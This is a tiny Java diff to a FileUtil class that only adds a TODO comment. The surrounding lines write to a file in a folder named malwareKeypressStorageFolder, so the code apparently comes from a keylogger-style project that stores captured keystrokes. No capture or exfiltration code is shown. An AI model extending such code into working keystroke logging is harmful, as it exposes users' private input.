@@ -109,7 +109,7 @@ public class FileUtil {
         DateFormat df = new SimpleDateFormat("dd/MM/yyyy-HH:mm:ss z :", Locale.ITALIAN);
         String time = df.format(Calendar.getInstance().getTime());
 
-
+        // TODO check if keypressFileName exists
         File keypressFile = new File(malwareKeypressStorageFolder, keypressFileName);
         FileWriter writer;
 
